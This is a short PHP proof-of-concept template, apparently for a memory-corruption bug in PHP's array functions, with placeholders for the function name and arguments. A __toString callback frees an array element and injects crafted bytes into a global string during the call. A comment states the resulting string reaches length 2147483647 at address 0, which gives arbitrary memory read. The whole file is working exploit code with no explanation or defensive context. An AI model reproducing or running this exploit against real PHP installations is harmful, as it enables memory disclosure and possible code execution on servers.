<?php

class dummy {
	public function __toString() {
		unset($GLOBALS['arr2'][0]);
		$GLOBALS['test1'] .= "\x00\x00\x00\xff\xff\xff\x7f\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
		return '0';
	}
}

$test1="\x00";
$arr1 = array(new dummy);
$arr2 = array('dddddd');
$out = %{funcname}(%{args2}$arr1, &$arr2);

// $out[0] will be string length 2147483647 and start at address 0
var_dump($out);
